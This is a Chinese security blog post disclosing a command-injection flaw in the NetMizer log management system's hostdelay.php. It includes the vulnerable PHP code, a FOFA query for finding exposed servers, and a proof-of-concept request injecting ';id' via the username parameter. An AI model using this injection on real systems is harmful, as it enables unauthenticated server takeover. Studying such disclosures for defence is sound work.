---
title: "NetMizer日志管理系统 hostdelay.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html
asset_dir: assets/netmizer日志管理系统-hostdelay.php-命令执行漏洞
---

# NetMizer日志管理系统 hostdelay.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/13 08:20
* 1045浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

SQL

软件

网页服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/chart/hostdelay.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞预警服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `hostdelay.php` 业务实现关键逻辑部分

深入探索

鉴权

恶意软件分析工具

JSON处理工具

## action=list

```
if($action == 'list'){  // do by c
        if(!$nodeid){
                $devices = array();
                $cmd = "ls $logpath";
                exec($cmd,$devices);
                for($i = 0; $i < count($devices); $i ++){
                        if(!ip2long($devices[$i])) continue;;
                        if(!$nodeid){
                                $nodeid = $devices[$i];
                                break;
                        }
                }
        }
        $stop = $start + $limit;
        //cgi -i 3232235877-3232235877 -a 1444974920 -s 0 -e 400
        $cmd = "$cgi -q 1 -s $start -e $stop -n $nodeid ";
        $cmd .= "-a $start_time -b $stop_time ";
        if(isset($iplist) && $iplist != ""){
                $iplists = explode("-", $iplist);
                $ipstart = ip2long($iplists[0]);
                if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                else $ipstop = $ipstart;
                $cmd .= "-i $ipstart-$ipstop ";
        }
        if(isset($username) && $username != "") $cmd .= "-u $username ";
        if(isset($sorttype)) $cmd .= "-c $sorttype ";
//echo "$cmd\n";
        $fp=@popen($cmd, "r");
```

深入探索

Web服务器

身份验证

服务器

`$nodeid`, `$iplist`, `$username`, `$sorttype` 这些参数均未经过过滤或转义就直接插入命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

其他两个 action 的分支也存在同样的[命令注入](https://mrxn.net/tag/rce)漏洞

## action=area

```
else if($action == 'area'){  // do by C
                $arr_tmp = initprotoArea($start_time, $stop_time, $inval_time);
                $cmd = "$cgi -q 2 -s 0 -e 200 -n $nodeid ";
                //$start_time = 1444971600; 
                $cmd .= "-a $start_time -b $stop_time ";
                if(isset($iplist) && $iplist != ""){
                        $iplists = explode("-", $iplist);
                        $ipstart = ip2long($iplists[0]);
                        if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                        else $ipstop = $ipstart;
                        $cmd .= "-i $ipstart-$ipstop ";
                }
                if(isset($username) && $username != "") $cmd .= "-u $username ";
//echo "$cmd\n";
                $fp=@popen($cmd, "r");
```

## action=detail

```
else if($action == 'detail'){  // do by C
                $cmd = "$cgi -q 2 -s 0 -e 200 -n $nodeid ";
                $cmd .= "-a $start_time -b $stop_time ";
                if(isset($iplist) && $iplist != ""){
                        $iplists = explode("-", $iplist);
                        $ipstart = ip2long($iplists[0]);
                        if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                        else $ipstop = $ipstart;
                        $cmd .= "-i $ipstart-$ipstop";
                }
                if(isset($username) && $username != "") $cmd .= "-u $username";
//echo "$cmd\n";
                $fp=@popen($cmd, "r");
                $arr_result = array();
```

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/chart/hostdelay.php?action=list&username=;id HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 `id` 命令并回显执行结果

[![NetMizer日志管理系统 hostdelay.php 命令执行漏洞](images/img-001-f7660ead8a79.webp)](https://image.mrxn.net/60d1d63d330d4d9ca0270c129aa81022.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.action=list](#toc-4-1-)
* [4.2.action=area](#toc-4-2-)
* [4.3.action=detail](#toc-4-3-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 hostdelay.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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